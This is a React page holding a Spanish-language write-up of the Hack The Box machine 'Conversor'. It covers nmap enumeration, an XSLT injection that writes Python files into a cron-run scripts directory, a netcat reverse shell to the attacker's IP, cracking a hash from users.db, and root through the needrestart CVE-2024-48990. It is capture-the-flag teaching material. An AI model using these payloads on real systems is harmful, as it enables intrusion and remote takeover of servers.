import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function Conversor() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();

  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/conversor.png" alt="Conversor machine thumbnail" className="mx-auto" />
      <br />
      <p><strong>Descripción:</strong> Conversor es una máquina Linux de dificultad fácil que corre un servicio de conversión de archivos. El objetivo es explotar
       vulnerabilidades en la aplicación web para obtener acceso inicial, luego elevar privilegios mediante explotación de configuraciones erróneas y finalmente,
       escalar a root abusando de permisos sudo.</p>
      <br />


      <strong>Enumeración</strong>
      <p>Comenzamos con un escaneo inicial de puertos usando <code>nmap</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 2000 {IP}`}</pre>
      <br />
      <p>Parámetros:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 2000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_1.png" alt="nmap first scan" className="mx-auto" />
      <br />

      <p>Se detectaron los puertos 22 y 80 abiertos. Realizamos un escaneo más detallado:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p22,80 -sCV -n -Pn {IP}`}</pre>
      <br />

      <p>Parámetros:</p>
      <ul>
        <li><code>-p22,80</code> escanea los puertos especificados</li>
        <li><code>-sCV</code> Realiza escaneo de versiones y scripts</li>
        </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_2.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Vemos que sobre el puerto 80 está corriendo un servidor web por http y con Apache en versión 2.4.52. Vemos que nos dice que no puede acceder a conversor.htb 
            por lo que debemos añadir la ip del servidor al /etc/hosts.</p>
      <br />

      <p>Luego accedemos a http://conversor.htb y vemos un panel de autenticación en el cual procedemos a registrarnos con un nuevo usuario.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_3.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Una vez creado el usuario, vemos que podemos acceder a la aplicación web donde en la propia página nos indica que tiene una funcionalidad que subiendo los escaneos de 
        nmap y plantillas en formato <strong>XSLT</strong> te lo representa de una forma mucho mas visual y fácil de entender. También nos dan la posibilidad de descargarnos 
        una plantilla para este fin</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_4.png" alt="web interface" className="mx-auto" />   
      <br />

      <p>Para probar la funcionalidad, subí el escaneo del propio servidor guardado en formato xml (esto lo hacemos añadiendo el parámetro de nmap -oX scan.xml ) y 
        la plantilla que nos dan y te lo representa así.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_5.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Seguimos revisando la página y en el menú principal vemos una opción de About, donde vemos información y un botón para descargarnos el código fuente de la aplicación.</p>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_6.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Esto es muy importante y a priori no debería estar ahí porque nos da mucha información sobre la aplicación y el código fuente, lo que facilita la explotación. Nos 
        descargamos el código fuente y vemos que tenemos.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_7.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Luego de revisar detalladamente el código fuente, vemos que hay una base de datos users.db que ahora mismo la que vemos está vacía, sin embargo nos da una idea de cómo 
        debería estar estructurada la de la aplicación, revisando el archivo install.md, nos da una breve explicación de cómo ejecutar la aplicación y más importante vemos una 
        tarea cron que está ejecutándose como el usuario www-data donde ejecuta todos los scripts en python del directorio /var/www/conversor.htb/scripts/.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Enumeracion/enumeracion_8.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Analizando que probablemente se esté ejecutando esta tarea cron en el servidor y que en principio podemos subir archivos al servidor con extensiones XML y XSLT. Nos va 
        indicando el camino por el que debemos seguir.</p>
      <br />
      






      <strong>Explotación</strong>
      <p>Vamos a utilizar <strong>Burp Suite</strong> para interceptar la petición donde hacemos el POST para convertir los escaneos de nmap en ese formato del servidor.</p>
      <br />

      <p>Luego de investigar al respecto del lenguaje XSLT, vemos que en caso de que el servidor no esté bien configurado, puedes inyectar código XSLT y extraer información del 
        servidor. Ver el enlace <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md" target="_blank" 
        className="text-blue-500 hover:underline" rel="noopener noreferrer">PayloadsAllTheThings/XSLT Injection</a> Ejemplo de esto:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_1.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Así obtenemos la versión del lenguaje XSLT que se está utilizando, la implementación concreta e información del proveedor.</p>
      <br />

      <p>Comprobado así que el servidor es vulnerable a la inyección XSLT, nuestro siguiente paso es intentar escribir un archivo .py en el directorio /var/www/conversor.htb/scripts/ 
        para ver si la tarea cron nos lo ejecuta. Para esto vamos a hacer algo muy simple: nos montamos un servidor web local y nos vamos a hacer una petición desde el servidor 
        conversor hacia nuestra máquina.</p>
      <br />

      <p>En nuestra máquina local:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -m http.server 8000`}</pre>
      <br />

      <p>En la petición:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`<?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:exsl="http://exslt.org/common"
        extension-element-prefixes="exsl"
        version="1.0">

        <xsl:template match="/">
            <exsl:document href="/var/www/conversor.htb/scripts/test.py" method="text">
            <xsl:text><![CDATA[
            import urllib.request
            urllib.request.urlopen("http://Nuestra_IP:8000")
            ]]></xsl:text>
            </exsl:document>
        </xsl:template>
    </xsl:stylesheet>`}
        </pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_2.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Esperamos un poco y vemos que efectivamente se está ejecutando la tarea cron y por ende el script que acabamos de crear, dicho sea de paso, se ejecuta repetidamente. Entonces 
        nuestro siguiente paso es intentar escribir un archivo .py en el directorio /var/www/conversor.htb/scripts/ que nos lance una reverse shell hacia nuestra máquina.</p>
      <br />

      <p>En nuestra máquina local nos ponemos en escucha (utilizamos <a href="https://github.com/brightio/penelope" target="_blank" className="text-blue-500 hover:underline" rel="noopener noreferrer">Penelope</a>):</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`penelope.py`}</pre>
      <br />

      <p>En la petición:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`<?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:exsl="http://exslt.org/common"
        extension-element-prefixes="exsl"
        version="1.0">

        <xsl:template match="/">
            <exsl:document href="/var/www/conversor.htb/scripts/test.py" method="text">
            <xsl:text><![CDATA[import os
            os.system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc Nuestra_IP 4444 > /tmp/f")
            ]]></xsl:text>
            </exsl:document>
        </xsl:template>
    </xsl:stylesheet>`}
        </pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_3.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Y vemos que recibimos correctamente la reverse shell. Estamos como el usuario www-data, revisamos los directorios del sitio web /var/www/conversor.htb/ y vemos el 
        archivo users.db; procedemos a revisarlo:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`sqlite3 users.db
sqlite> .dump`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_4.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Obteniendo un usuario y un hash de contraseña, procedemos a crackearla con <a href="https://crackstation.net/" target="_blank" 
      className="text-blue-500 hover:underline" rel="noopener noreferrer">Crackstation</a>:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_5.png" alt="user registration" className="mx-auto" />
      <br />

      <p>Obteniendo así el par de credenciales <strong>fismathack:Keepmesafeandwarm</strong>, donde fismathack es usuario del servidor. Nos conectamos por ssh:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`ssh fismathack@{IP}`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_6.png" alt="registration form" className="mx-auto" />
      <br />

      <p>Y estamos dentro del servidor como usuario fismathack, revisamos su directorio personal de trabajo y vemos la primera flag.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Explotacion/explotacion_7.png" alt="registration success" className="mx-auto" />
      <br />

      <strong>Escalada de Privilegios</strong>
      <p>Ahora procedemos con la escalada de privilegios. Ejecutamos el comando:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo -l`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Escalada/escalada_1.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>Vemos que podemos ejecutar el comando needrestart como root sin contraseña. Investigamos más sobre este comando y vemos que se utiliza para reiniciar servicios del sistema.
        Investigando la versión del servidor 3.7 vemos que es vulnerable, tiene la CVE-2024-48990 que dice en versiones anteriores a la 3.8, permite a atacantes locales ejecutar
        código arbitrario como root engañando a needrestart para que ejecute el intérprete de Python con una variable de entorno PYTHONPATH controlada por el atacante.</p>      
      <br />

      <p>Hay algunos scripts públicos para explotar esta vulnerabilidad <a href="https://github.com/BLUEBERRYP1LL/CVE-2024-48990" target="_blank" 
      className="text-blue-500 hover:underline" rel="noopener noreferrer">aquí</a> te dejo uno:</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Escalada/escalada_2.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>Nos dice en el README que nos descarguemos el script, le demos permisos y ejecutemos; luego que desde una segunda consola lancemos el comando needrestart como root 
        y finalmente llamemos a la consola que creó para nosotros.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Escalada/escalada_3.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>En la máquina víctima:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`chmod +x exploit.py
./exploit.sh`}</pre>
      <br />
      
      <p>Nos conectamos nuevamente por SSH en una segunda consola a la máquina víctima y ejecutamos:</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo /usr/bin/needrestart`}</pre>
      <br />

      <p>Finalmente llamamos a la consola que creo para nosotros.</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`/var/tmp/.rootshell -p`}</pre>
      <br />
      
      <p>Ya como root leemos la segunda flag</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`cat /root/root.txt`}</pre>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/Conversor_HTB/Escalada/escalada_4.png" alt="api user invite" className="mx-auto" />
      <br />
      
      <strong>Conclusiones</strong>
      <p>Conversor es una máquina excelente para aprender sobre vulnerabilidades web y explotación de sistemas. Comenzamos con una enumeración básica de puertos 
        y servicios, descubriendo una aplicación web que permite subir archivos XML y XSLT para convertir escaneos de nmap. La clave estuvo en identificar la
        inyección XSLT, que nos permitió ejecutar código arbitrario en el servidor y aprovechando una tarea cron mal configurada, ejecutar scripts Python en un
        directorio específico. Una vez con acceso inicial como www-data, accedimos a la base de datos de usuarios, crackeamos las credenciales y escalamos 
        a un usuario del sistema. Finalmente, aprovechamos una vulnerabilidad en uno de los comandos para obtener acceso root. Esta máquina resalta la importancia 
        de validar entradas en aplicaciones web, proteger configuraciones de tareas programadas y mantener software actualizado.</p>
    </article>
    </>
  );
}
